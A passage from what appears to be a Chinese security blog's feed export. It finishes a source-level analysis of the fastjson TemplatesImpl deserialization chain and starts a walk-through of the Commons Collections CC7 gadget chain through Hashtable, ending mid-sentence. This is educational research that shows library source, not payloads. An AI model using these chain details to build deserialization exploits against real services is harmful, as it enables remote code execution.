title="黑名单判断"></p><p>后面就是对<code>className</code>进行分类判断，最后没有找到对应类的反序列化器，最后通过<code>createJavaBeanDeserializer</code>方法对当前<code>clazz</code>创建一个反序列化器</p><p><img src="/posts/ad3be047/fj1-35.png" title="createJavaBeanDeserializer"></p><p>跟进<code>createJavaBeanDeserializer</code>方法，其中<code>asmEnable</code>默认开启，然后判断<code>clazz</code>类是否支持字节码操作，然后进行<code>JavaBeanInfo</code>创建</p><p><img src="/posts/ad3be047/fj1-36.png" title="JavaBeanInfo"></p><p>在<code>setter/getter</code>分析中提到的<code>build</code>方法主要是通过反射遍历获取类中的方法名和数据保存在<code>Fieldlist</code>中然后放入<code>beaninfo</code>数组中。</p><p><img src="/posts/ad3be047/fj1-14.png" title="beaninfo"></p><p><code>beaninfo</code>创建后，后面的代码部分就是针对<code>Beaninfo</code>的字段属性进行循环遍历检查合法性，属性查询完后，创建<code>JavaBeanDeserializer</code>反序列化器</p><p><img src="/posts/ad3be047/fj1-37.png" title="JavaBeanDeserializer"><br><img src="/posts/ad3be047/fj1-38.png" title="JavaBeanDeserializer"></p><p><code>JavaBeanDeserializer</code>方法中先是声明<code>beanInfo.sortedFields</code>的<code>FieldDeserializer</code>反序列化器，然后循环读取<code>sortedFields</code>排序后的属性给<code>fieldInfo</code>变量，然后创建新的字段反序列化器<code>createFieldDeserializer</code>，最后新反序列化器放入<code>sortedFieldDeserializers</code>数组中</p><p><img src="/posts/ad3be047/fj1-39.png" title="sortedFieldDeserializers"></p><p>后半段是循环获取<code>beanInfo.fields</code>的属性，然后通过<code>getFieldDeserializer</code>方法在<code>sortedFieldDeserializers</code>数组中查找是否匹配，匹配的话就放入到<code>fieldDeserializers</code>数组当中。</p><p><img src="/posts/ad3be047/fj1-40.png" title="sortedFieldDeserializers"></p><p>到此，<code>JavaBeanDeserializer</code>反序列化器创建成功，并放入到反序列化器当中，最后返回反序列化器<code>derializer</code></p><p><img src="/posts/ad3be047/fj1-41.png" title="derializer"></p><p>获取到反序列化器后，正式对该反序列化器进行反序列化操作</p><p><img src="/posts/ad3be047/fj1-42.png" title="derialize"></p><p>反序列化的前半部分都是对类的一些属性信息进行判断（<code>token</code>的判断，<code>laxer</code>分词器的创建等）</p><p><img src="/posts/ad3be047/fj1-43.png" title="derialize"></p><p>通过循环读取<code>sortedFieldDeserializers</code>数组获取反序列化器中的属性数据，获取过后再循环判断获取的类的分类所属，在进行对应类属性赋值</p><p><img src="/posts/ad3be047/fj1-44.png" title="sortedFieldDeserializers"></p><p>经过上面的对<code>sortedFieldDeserializers</code>获取的当前属性信息的操作后，创建对解析器对象进行实例化</p><p><img src="/posts/ad3be047/fj1-45.png" title="createInstance"><br><img src="/posts/ad3be047/fj1-46.png" title="实例化对象"></p><p>实例化对象后，开始解析该对象在解析器中的字段属性</p><p><img src="/posts/ad3be047/fj1-47.png" title="解析字段属性"></p><p>字段反序列化器会模糊匹配<code>key</code>，跟进<code>smartMatch</code>方法</p><p><img src="/posts/ad3be047/fj1-48.png" title="smartMatch"></p><p>先判断<code>Key</code>是否存在，存在然后通过<code>getFieldDeserializer</code>方法查找<code>key</code>的反序列化器，如果找不到该<code>key</code>的反序列化器，然后判断<code>key</code>是否以<code>is</code>为开头，随后循环获取<code>sortedFieldDeserializers</code>数组内容获取其中的<code>fieldInfo、fieldClass、fieldName</code>等属性</p><p><img src="/posts/ad3be047/fj1-49.png" title="smartMatch"></p><p>因为在<code>getFieldDeserializer</code>中匹配<code>Key</code>是否在<code>sortedFieldDeserializers</code>数组中，由于数组中的值没有”_”开头，因此找不到<code>key</code>的反序列化器</p><p><img src="/posts/ad3be047/fj1-50.png" title="getFieldDeserializer"></p><p>条件都不满足，找不到<code>FieldDeserializer</code>属性反序列化器，然后就对属性进行字符替换操作，此时的<code>Key</code>由<code>&quot;_outputProperties&quot;</code>被替换成<code>&quot;outputProperties&quot;</code></p><p><img src="/posts/ad3be047/fj1-51.png" title="replaceAll"><br><img src="/posts/ad3be047/fj1-52.png" title="replaceAll"></p><p>然后再次调用<code>getFieldDeserializer</code>方法，查询是否存在<code>key2</code>的反序列化器，此时<code>sortedFieldDeserializers</code>数组中存在<code>outputProperties</code>字段，因此能够找到反序列化器</p><p><img src="/posts/ad3be047/fj1-54.png" title="getFieldDeserializer"><br><img src="/posts/ad3be047/fj1-55.png" title="outputProperties"></p><p>返回属性反序列化器，此时获取到<code>getoutputProperties</code>方法（build中提到的getter&#x2F;setter建立会存储get和set方法，反序列化器查询匹配到字段后会返回该方法的反序列化器）</p><p><img src="/posts/ad3be047/fj1-56.png" title="getoutputProperties"></p><p>找到属性反序列化器后，对该属性进行反序列化解析</p><p><img src="/posts/ad3be047/fj1-57.png" title="parseField"></p><p>解析过程中通过<code>getFieldValueDeserilizer</code>方法获取属性值的反序列化器，并对属性值反序列化器进行反序列化解析获取值</p><p><img src="/posts/ad3be047/fj1-58.png" title="getFieldValueDeserilizer"></p><p>然后将获取的值通过<code>setValue</code>方法赋值给字段属性</p><p><img src="/posts/ad3be047/fj1-59.png" title="setValue"></p><p>跟进<code>setValue</code>方法，通过反射获取字段属性的方法</p><p><img src="/posts/ad3be047/fj1-60.png" title="setValue"></p><p>最后通过反射执行<code>Object</code>对象的<code>Method</code>方法，即执行<code>TemplatesImpl.getoutputProperties()</code>,触发漏洞</p><p><img src="/posts/ad3be047/fj1-61.png" title="反射执行方法"><br><img src="/posts/ad3be047/fj1-62.png" title="触发漏洞"></p><h2 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h2><p>根据上面的分析过程，稍微理一下fastjson的执行流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JSON对象解析</span><br><span class="line">  -&gt;创建默认JSON解析器parser（方法：DefaultJSONParser）</span><br><span class="line">    -&gt;对解析器pareser进行解析序列化解析（方法：parseObject）</span><br><span class="line">      -&gt;根据token获取对应反序列化器deserializer（方法：getDeserializer）</span><br><span class="line">        -&gt;对反序列化器deserializer进行反序列化解析（方法：deserialize）</span><br><span class="line">          -&gt;对对象和方法名进行解析（方法：pareseObject）</span><br><span class="line">            -&gt;获取key值(@type)，类加载key对象Class</span><br><span class="line">              -&gt;搜寻类对象的反序列化器</span><br><span class="line">                -&gt;搜寻不到，再创建反序列化器（方法：createJavaBeanDeserializer）</span><br><span class="line">                -&gt;过程中，build javabeaninfo信息，存储setter/getter信息放入Fieldlist中</span><br><span class="line">                -&gt;过程中，对Fieldlist字段进行创建字段反序列化器createFieldDeserializer</span><br><span class="line">                -&gt;最后反序列化器JavaBeanDeserializer创建成功</span><br><span class="line">                  -&gt;正式对反序列化器进行反序列化操作(方法：deserialize)</span><br><span class="line">                    -&gt;通过sortedFieldDeserializers获取字段数据，然后实例化对象</span><br><span class="line">                      -&gt;解析对象字段属性进行模糊匹配查找属性前缀get/set是否存在，&quot;_&quot;符号进行删除等操作</span><br><span class="line">                        -&gt;对方法查找方法的反序列化器（方法：getFieldDeserializer）</span><br><span class="line">                          -&gt;通过方法反序列化器对方法属性进行解析(获取到类方法名)，通过setValue方法给字段赋值</span><br><span class="line">                            -&gt;通过反射调用执行方法</span><br></pre></td></tr></table></figure><h2 id="base64编码问题"><a href="#base64编码问题" class="headerlink" title="base64编码问题"></a>base64编码问题</h2><p>在解析字段属性中，解析到<code>&quot;_bytecodes&quot;</code></p><p><img src="/posts/ad3be047/fj1-63.png" title="_bytecodes解析"></p><p>然后获取对应反序列化器，对反序列化器进行再次解析</p><p><img src="/posts/ad3be047/fj1-64.png" title="反序列化器解析"></p><p>再次跟进，此时属性反序列化器为<code>ObjectArrayCodec</code>，调用<code>ObjectArrayCodec</code>的反序列化方法<code>deserialze</code></p><p><img src="/posts/ad3be047/fj1-65.png" title="反序列化器解析"></p><p>过程中会对参数内容集合进行解析</p><p><img src="/posts/ad3be047/fj1-66.png" title="反序列化器解析"></p><p>进入对集合进行解析，此时<code>laxer</code>经过<code>nexttoken()</code>方法后重新赋值，再次对<code>value</code>进行反序列化解析</p><p><img src="/posts/ad3be047/fj1-69.png" title="deserialze"></p><p>跟进反序列化方法，此时<code>laxer</code>匹配<code>JSONToken.LITERAL_STRING</code>，调用<code>bytesValue()</code>方法</p><p><img src="/posts/ad3be047/fj1-67.png" title="解析字段"></p><p>跟进<code>bytesValue()</code>方法，在这里对<code>txt</code>也就是<code>Input</code>的内容进行<code>base64</code>解码，所以<code>_bytecodes</code>需要经过base64编码</p><p><img src="/posts/ad3be047/fj1-68.png" title="base64解码"></p><h1 id="0x05、总结"><a href="#0x05、总结" class="headerlink" title="0x05、总结"></a>0x05、总结</h1><p>跟完TemplatesImpl链，头都大了，总的来说就是通过创建序列化器去存储序列化对象的相关信息，再通过反序列化器解析反序列化类对象、类字段、方法等信息，最后再解析反序列化器。跟一遍下来的感觉就是不停的创建反序列化器，再解析反序列化器的内容，结合getter触发代码执行，虽然绕了很多，但在这里面也学到了很多，理解的过程也不完全，很多细节上的代码段也没理解透意思，就在大体框架走了一遍，可能还存在一些理解错误的地方，后面遇到了再改吧。</p><h1 id="0x06、参考链接"><a href="#0x06、参考链接" class="headerlink" title="0x06、参考链接"></a>0x06、参考链接</h1><p><a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a><br><a href="https://www.w3cschool.cn/fastjson/">https://www.w3cschool.cn/fastjson/</a><br><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/rwx6sb">https://www.yuque.com/tianxiadamutou/zcfd4v/rwx6sb</a><br><a href="https://y4er.com/posts/fastjson-learn/">https://y4er.com/posts/fastjson-learn/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC7链学习与分析</title>
      <link href="/posts/40ba40f0.html"/>
      <url>/posts/40ba40f0.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC7的触发点同CC1一样，采用ChainedTransformer链和LazyMap类，入口点变了，跟前面CC1~6不一样，但逆向思维去分析查找链实在没办法，效果跟正向分析没啥区别了，所以主要以正向分析去学习，还是单独整理出来吧</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><p>CC7链也利用<code>ChainedTransformer</code>链和<code>LazyMap</code>类作为触发点，入口不一样，目的都是为了调用<code>lazyMap.get()</code>方法</p><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>回顾LazyMap触发点：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li><code>lazyMap.get()</code>方法会调用<code>ChainedTransformer.transform()</code>执行链转换器内的<code>Runtime.exec()</code>方法达到命令执行的目的。</li></ul><hr><p>CC1~6中使用到LazyMap的链：<br>CC1（LazyMap链）：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法，随后将<code>LazyMap</code>对象传入<code>AnnotationInvocationHandler</code>代理类。</li><li>通过动态代理，在生成二次代理对象时调用对象的<code>invoke</code>方法，其中<code>invoke</code>方法中调用<code>LazyMap.get()</code>方法、<code>get()</code>方法调用<code>ChainedTransformer.transform()</code>方法最后实现<code>InvokerTransformer.transform()</code>执行命令;</li></ul><hr><p>CC5：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.toString()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li><li>将<code>TiedMapEntry</code>对象通过反射赋值给<code>BadAttributeValueExpException</code>类的<code>val</code>值，通过反序列化<code>BadAttributeValueExpException</code>类对象，调用重写<code>readObject</code>方法中的<code>val.toString()</code>。</li><li><code>val.toString()</code>调用等效于<code>TiedMapEntry.toString()</code>，即调用<code>TiedMapEntry.getValue()</code>方法，达到调用<code>lazyMap.get()</code>方法触发代码执行。</li></ul><hr><p>CC6：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.hashCode()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li><li>通过使用<code>hashmap</code>的<code>put</code>方法添加元素时调用<code>hash(key)</code>方法，进而调用<code>key.hashCode()</code>方法，将<code>TiedMapEntry</code>对象作为key<code>put</code>入<code>hashmap</code>中，达到调用<code>TiedMapEntry.hashCode()</code>的目的（hashSet同理,本质上都是调用hashmap）。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>回到<code>lazyMap.get()</code>方法本身上来，CC7使用了<code>Hashtable</code>作为入口，也就是说对<code>Hashtable</code>对象进行序列化，然后在反序列化时触发漏洞</p><p>简述Hashtable哈希表:</p><blockquote><p>Hashtable是原始的java.util的一部分， 是一个Dictionary具体的实现 。<br>然而，Java 2 重构的Hashtable实现了Map接口，因此，Hashtable现在集成到了集合框架中。它和HashMap类很相似，但是它支持同步。<br>像HashMap一样，Hashtable在哈希表中存储键&#x2F;值对。当使用一个哈希表，要指定用作键的对象，以及要链接到该键的值。<br>然后，该键经过哈希处理，所得到的散列码被用作存储在该表中值的索引。</p></blockquote><p>同<code>hashmap</code>一样，都是存储键值对&lt;key,value&gt;的散列表。</p><p><code>Hashtable</code>同样重写了序列化和反序列化过程</p><h3 id="hashtable反序列化过程"><a href="#hashtable反序列化过程" class="headerlink" title="hashtable反序列化过程"></a>hashtable反序列化过程</h3><hr><p>序列化（writeObject）过程，其实查看英文注解就大概知道这个过程了:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//声明一个Entry变量，用来临时存储读取的数据</span></span><br><span class="line">        Entry&lt;Object, Object&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="comment">//默认写入非static和transient的属性</span></span><br><span class="line">            <span class="comment">// Write out the length, threshold, loadfactor</span></span><br><span class="line">            s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//写入table表的长度和元素数量</span></span><br><span class="line">            <span class="comment">// Write out length, count of elements</span></span><br><span class="line">            s.writeInt(table.length);</span><br><span class="line">            s.writeInt(count);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//依次读取table表中的键值对，写入到entryStack变量中</span></span><br><span class="line">            <span class="comment">// Stack copies of the entries in the table</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">                Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                    entryStack =</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                    entry = entry.next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//依次读取entryStack变量中数据，将entry里的Key和value写入</span></span><br><span class="line">        <span class="comment">// Write out the key/value objects from the stacked entries</span></span><br><span class="line">        <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">            s.writeObject(entryStack.key);</span><br><span class="line">            s.writeObject(entryStack.value);</span><br><span class="line">            entryStack = entryStack.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>序列化过程简单来说就是创建一个<code>Entry</code>类型变量<code>entryStack</code>来读取<code>table</code>中的<code>entry</code>数据，再依次读取<code>entryStack</code>中的<code>entry</code>元素中的<code>key</code>和<code>value</code>写入到流中。</p><hr><p>反序列化（readObject）过程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//读取默认属性</span></span><br><span class="line">        <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取原始table长度和元素成员数量</span></span><br><span class="line">        <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//重新计算table的长度</span></span><br><span class="line">        <span class="comment">// Compute new size with a bit of room 5% to grow but</span></span><br><span class="line">        <span class="comment">// no larger than the original size.  Make the length</span></span><br><span class="line">        <span class="comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span></span><br><span class="line">        <span class="comment">// Guard against the length ending up zero, that&#x27;s not valid.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">            length = origlength;</span><br><span class="line">        <span class="comment">//创建计算好长度的table表</span></span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取流中所有元素的key和value</span></span><br><span class="line">        <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">            <span class="comment">//同步将key和value通过reconstitutionPut方法写入到新创建的table表中</span></span><br><span class="line">            <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反序列化过程相对也比较好理解，主要就是从流中读取到原始信息，再重新计算长度去创建一个新<code>table</code>表，并读取流中<code>key</code>和<code>value</code>通过<code>reconstitutionPut</code>方法写入到<code>table</code>表中<br>反序列化过程主要只调用了<code>reconstitutionPut</code>方法，该方法比较关键，再跟进<code>reconstitutionPut</code>方法</p><h3 id="reconstitutionPut"><a href="#reconstitutionPut" class="headerlink" title="reconstitutionPut()"></a>reconstitutionPut()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">        <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">        <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Creates the new entry.</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">        tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同样通过注解也很好理解步骤（主要就是value不允许为Null，然后key值不能重复，元素hash不能相同，也是hashtable的特性）</p><ul><li>先判断value值，如果value为空，就抛出序列化异常</li><li>计算key的hash，再根据hash和table长度计算出存储索引index，并判断该key的hash或者该key的值是否在表中存在，如果已存在就抛出序列化异常</li><li>经过判断没问题后 就将key value写入到Entry中</li></ul><p><code>reconstitutionPut</code>方法中调用了<code>key.hashCode()</code>方法和<code>e.key.equals(key)</code>方法，其中<code>key.hashCode()</code>方法在下面<font color="red">POC延伸</font>中会分析，现在还有<code>e.key.equals(key)</code>方法，在for循环中，判断当前元素的<code>key</code>的<code>hash</code>在表中是否存在，并且会对元素的<code>key</code>对表中元素的<code>key</code>进行<code>equals()</code>匹配查看<code>key</code>是否在表中存在。<br>跟进<code>e.key.equals(key)</code>方法，其中<code>e.key</code>表示从流中读取的<code>table</code>表中的<code>key</code>，也就是我们<code>put</code>进的<code>key</code>值。<br>该链通过<code>Hashtable</code>调用<code>Lazymap</code>，那传入的<code>key</code>值肯定就为<code>Lazymap</code>对象。<br><code>e.key.equals(key)</code>调用相当于<code>e.Lazymap.equals(key)</code></p><p><font color="red">满足条件：</font></p><ul><li>value不能为空，设置value值就行。</li><li>需要<code>index</code>相同且<code>e.hash == hash</code>，也就是在table表中需要有两个元素的hash是相等的，hash相等才能获取到table中的元素，才能去执行<code>e.key.equals(key)</code>这个方法，因此必须put进两个hash相等的元素。</li></ul><h3 id="AbstractMapDecorator-equals"><a href="#AbstractMapDecorator-equals" class="headerlink" title="AbstractMapDecorator.equals()"></a>AbstractMapDecorator.equals()</h3><p>跟进<code>Lazymap.equals()</code>方法，但<code>Lazymap</code>类本身没有<code>equals()</code>方法，实际是调用它的父类<code>AbstractMapDecorator</code>下的<code>equals()</code>方法</p><p><img src="/posts/40ba40f0/cc7-2.png" title="AbstractMapDecorator.equals()"></p><p>其中会判断<code>object</code>对象是否为同一个对象，是的话返回<code>true</code>，如果不是同一个对象，就执行<code>map.equals(object)</code>，其中的<code>map</code>为<code>Lazymap</code>传参的<code>map</code>，也就是<code>hashmap</code>对象</p><p>继续跟进<code>hashmap.equals()</code>方法，同样<code>hashmap</code>本身只有在它的<code>Node</code>子类中存在<code>equals()</code>方法，实际调用的也是父类下的<code>equals()</code>方法</p><h3 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a>AbstractMap.equals()</h3><p><img src="/posts/40ba40f0/cc7-3.png" title="AbstractMap.equals()"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="comment">//判断是否是同一个对象</span></span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//判断该对象是否属于Map类型</span></span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">        <span class="comment">//判断元素个数是否相同</span></span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建迭代器</span></span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                <span class="comment">//依次获取元素</span></span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="comment">//获取Key和value值</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="comment">//value为空的话执行下面判断体</span></span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//value不为空的话执行下面判断体</span></span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><font color="red">满足条件：</font></p><ul><li>不能为同一个对象，如果两个元素相同就直接返回true</li><li>该对象类型必须为Map类型，不是Map类型的话返回false</li><li>对象元素个数必须相同，不同的话返回false</li></ul><p>满足以上条件后，由于本身<code>value</code>不能为空（为空就不会进入到这个调用阶段了），因此会执行<code>if 